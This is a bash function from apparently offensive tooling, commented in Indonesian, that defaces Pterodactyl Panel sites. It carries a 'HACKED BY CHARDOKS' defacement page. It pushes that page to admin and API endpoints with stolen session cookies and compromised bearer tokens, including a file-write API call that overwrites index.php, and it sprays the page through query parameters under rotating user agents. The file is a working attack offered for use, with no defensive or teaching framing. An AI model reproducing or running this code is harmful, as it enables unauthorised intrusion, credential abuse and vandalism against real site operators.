#!/bin/bash

# Deface injection engine

inject_deface() {
    local deface_file="$1"
    local deface_content=""
    
    log_info "Initializing deface injection..."
    
    # Baca konten deface
    if [[ -f "$deface_file" ]]; then
        deface_content=$(cat "$deface_file")
    else
        # Deface default jika file tidak ditemukan
        deface_content='<!DOCTYPE html>
<html>
<head>
    <title>HACKED BY CHARDOKS</title>
    <style>
        body {
            background: black;
            color: green;
            font-family: monospace;
            text-align: center;
            padding-top: 20%;
        }
        h1 { font-size: 48px; }
        .glitch { animation: glitch 1s infinite; }
        @keyframes glitch {
            0% { text-shadow: 2px 0 red; }
            50% { text-shadow: -2px 0 blue; }
            100% { text-shadow: 2px 0 red; }
        }
    </style>
</head>
<body>
    <h1 class="glitch">PTERODACTYL PANEL</h1>
    <h2>System Terminated</h2>
    <p>Hacked by Chardox - Knowledge is Power</p>
    <p>Your data has been archived</p>
</body>
</html>'
    fi
    
    # Endpoint potensial untuk injeksi
    local injection_endpoints=(
        "/admin/settings"
        "/api/application/nests"
        "/api/application/servers"
    )
    
    # Cek apakah ada sesi yang berhasil diambil sebelumnya
    local session_file="$OUTPUTS_DIR/session_data/session_${TARGET//[^a-zA-Z0-9]/_}.cookie"
    
    if [[ -f "$session_file" ]]; then
        log_info "Found existing session, attempting injection..."
        
        # Coba injeksi ke setiap endpoint dengan cookie yang ada
        for endpoint in "${injection_endpoints[@]}"; do
            local target_url="${TARGET_URL}${endpoint}"
            
            # Gunakan curl dengan cookie untuk injeksi
            curl -s -X POST \
                -b "$session_file" \
                -H "Content-Type: application/json" \
                -H "User-Agent: $(random_user_agent)" \
                -d "{\"template\": \"$deface_content\"}" \
                "$target_url" 2>/dev/null || true
            
            sleep 1
        done
    fi
    
    # Coba injeksi melalui parameter query pada endpoint publik
    local public_endpoints=(
        "/"
        "/index.php"
        "/resources/views/layouts/admin.blade.php"
    )
    
    for endpoint in "${public_endpoints[@]}"; do
        local target_url="${TARGET_URL}${endpoint}"
        
        # Coba berbagai metode injeksi
        local payloads=(
            "?deface=$deface_content"
            "?template=$deface_content"
            "?view=$deface_content"
            "?page=$deface_content"
        )
        
        for payload in "${payloads[@]}"; do
            curl -s -X GET \
                -H "User-Agent: $(random_user_agent)" \
                "${target_url}${payload}" 2>/dev/null || true
        done
    done
    
    # Jika ada token API yang berhasil dikompromi, gunakan untuk injeksi
    local compromised_tokens="$OUTPUTS_DIR/compromised_tokens.txt"
    if [[ -f "$compromised_tokens" ]]; then
        while IFS= read -r token; do
            if [[ -n "$token" ]]; then
                log_info "Using compromised token for injection: $token"
                
                # Injeksi melalui API dengan token
                curl -s -X POST \
                    -H "Authorization: Bearer $token" \
                    -H "Content-Type: application/json" \
                    -H "User-Agent: $(random_user_agent)" \
                    -d "{\"content\": \"$deface_content\", \"path\": \"index.php\"}" \
                    "${TARGET_URL}/api/application/files/write" 2>/dev/null || true
            fi
        done < "$compromised_tokens"
    fi
    
    log_success "Deface injection completed"
    echo "$deface_content" > "$OUTPUTS_DIRs/deface_success.log"
    log_info "Deface content saved to $OUTPUTS_DIR/deface_success.log"
}
